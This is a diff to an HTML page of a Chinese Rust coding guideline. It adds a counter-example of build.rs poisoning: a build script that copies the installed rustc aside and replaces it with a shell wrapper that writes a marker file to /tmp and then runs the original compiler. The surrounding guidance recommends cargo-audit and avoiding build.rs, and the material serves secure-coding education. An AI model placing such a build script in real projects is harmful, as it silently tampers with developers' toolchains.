@@ -11263,6 +11263,30 @@ pub fn scan() -&gt; Result&lt;(), io::Error&gt; {
 <li>使用 <a href="https://crates.io/crates/cargo-audit"><code>cargo-audit</code></a> 检测依赖的安全性。</li>
 <li>使用自己的构建工具来替代 <code>Cargo</code>，可以更加安全。比如 Android 团队使用其<code>Soong</code>构建系统支持 Rust ，就选择不支持 <code>build.rs</code> ，就是考虑到审查起来太麻烦。</li>
 </ul>
+<p><strong>【反例】</strong></p>
+<p>下面是模拟 <code>build.rs</code> 投毒的示例：</p>
+<pre><pre class="playground"><code class="language-rust">// From: https://github.com/Neutron3529/poisoning-rustc
+
+use std::{io::Write,fs,env,path::Path};
+
+fn main() -&gt; Result&lt;(),Box&lt;dyn std::error::Error&gt;&gt;{
+    let cargo=env::var(&quot;CARGO&quot;)?;
+    let cargo_dir=Path::new(&amp;cargo);
+    let bin=cargo_dir.parent().ok_or(std::io::Error::new(std::io::ErrorKind::Other, &quot;no!&quot;))?;
+    let rustc=env::var(&quot;RUSTC&quot;)?;
+    let orc=&quot;old_&quot;.to_string()+&amp;rustc;
+    let rcloc=bin.join(rustc);
+    let ocloc=bin.join(orc);
+    if !ocloc.exists() &amp;&amp; rcloc.exists(){
+        fs::copy(&amp;rcloc,&amp;ocloc)?;// use copy to preserve 'x' permissions.
+        let mut f=fs::File::create(rcloc)?;
+        f.write_all(b&quot;#!/bin/sh\necho 'The rustc has been \&quot;poisoned\&quot; by poisoning crate, which suggests that, your computer is not strong enough to defend such attack' &gt; /tmp/rustc_infected\necho \&quot;If you're using Linux, your rustc perhaps works just fine\&quot; &gt;&gt; /tmp/rustc_infected\necho \&quot;but windows users may suffer from executing a linux-only script.\&quot; &gt;&gt; /tmp/rustc_infected\nexec &quot;)?;
+        f.write_all(ocloc.to_str().ok_or(std::io::Error::new(std::io::ErrorKind::Other, &quot;oh no!&quot;))?.as_bytes())?;
+        f.write_all(b&quot; $*&quot;)?
+    }
+    Ok(())
+}
+</code></pre></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="gsec01--代码中不要出现非法-unicode-字符也要防范非法-unicode-字符"><a class="header" href="#gsec01--代码中不要出现非法-unicode-字符也要防范非法-unicode-字符">G.SEC.01  代码中不要出现非法 Unicode 字符，也要防范非法 Unicode 字符</a></h2>
 <p><strong>【级别】</strong> 要求</p>
 <p><strong>【描述】</strong></p>
